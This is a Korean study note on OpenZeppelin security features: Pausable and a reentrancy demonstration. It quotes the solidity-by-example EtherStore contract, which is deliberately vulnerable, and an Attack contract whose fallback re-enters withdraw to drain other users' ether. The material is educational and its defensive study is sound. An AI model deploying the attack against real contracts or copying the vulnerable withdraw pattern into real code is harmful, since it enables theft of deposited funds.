# Openzepplin Security

https://github.com/OpenZeppelin/openzeppelin-contracts/tree/master/contracts/security

1.Pause & Unpause

컨트렉트 자체를 비활성화 시키고 활성화 시키는 부분

아래 함수들을 상속받은 pause와 unpause를 자체적으로 구현하여 활용한다.
```
    /**
     * @dev Triggers stopped state.
     *
     * Requirements:
     *
     * - The contract must not be paused.
     */
    function _pause() internal virtual whenNotPaused {
        _paused = true;
        emit Paused(_msgSender());
    }

    /**
     * @dev Returns to normal state.
     *
     * Requirements:
     *
     * - The contract must be paused.
     */
    function _unpause() internal virtual whenPaused {
        _paused = false;
        emit Unpaused(_msgSender());
    }
```

함수를 실행시키면 bool 값이 바뀌게 되고 bool값에 변동이 있을 시에 비활성화/ 활성화가 바뀌는 구조이다.
문제가 생길 경우 일시적으로 멈추도록 만드는 함수로 보안이 중요한 컨트렉트 및 함수에 넣게 되는데
최초 상호작용하는 하나의 함수에만 넣게되면 하위로 호출되는 함수에는 굳이 넣을 필요는 없다.

2. Re-enterancy

함수의 최종 결과가 리턴되기 전에 다시 한번 호출을 하는 부분으로서
외부 호출이 일어나는 경우 발생이 가능하다.

아래 소스 코드를 통해서 reEntrancyTest는 openzepplin의 reentrant guard를 적용하지 않은 부분이며
reEntracyTest2는 openzepplin의 reentrant guard를 적용한 부분이다.

해당 테스트를 통해서 리앤터런시 공격이 성공한것과 실패한 것을 볼 수 있는데

Attack 컨트렉트를 보면 deposit을 하자마자 바로 wihdraw를 하는 것을 볼 수 있으며
withdraw를 실행할때 지갑 주소로 이더를 주고 잔고 전송을 하게 되는데 이더를 주는 과정에서
fallback이 호출되게 되면 여기서 withdraw를 한번 더 실행한다.

따라서 1이더의 잔고까지 남았을 경우까지 fallback에서 withdraw가 진행되게 되므로 공격이 가능해지는 샘이다.

Source : https://solidity-by-example.org/hacks/re-entrancy/

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

/*
EtherStore is a contract where you can deposit and withdraw ETH.
This contract is vulnerable to re-entrancy attack.
Let's see why.

1. Deploy EtherStore
2. Deposit 1 Ether each from Account 1 (Alice) and Account 2 (Bob) into EtherStore
3. Deploy Attack with address of EtherStore
4. Call Attack.attack sending 1 ether (using Account 3 (Eve)).
   You will get 3 Ethers back (2 Ether stolen from Alice and Bob,
   plus 1 Ether sent from this contract).

What happened?
Attack was able to call EtherStore.withdraw multiple times before
EtherStore.withdraw finished executing.

Here is how the functions were called
- Attack.attack
- EtherStore.deposit
- EtherStore.withdraw
- Attack fallback (receives 1 Ether)
- EtherStore.withdraw
- Attack.fallback (receives 1 Ether)
- EtherStore.withdraw
- Attack fallback (receives 1 Ether)
*/

contract EtherStore {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint bal = balances[msg.sender];
        require(bal > 0);

        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract Attack {
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

```

테스트
```
npx hardhat test
```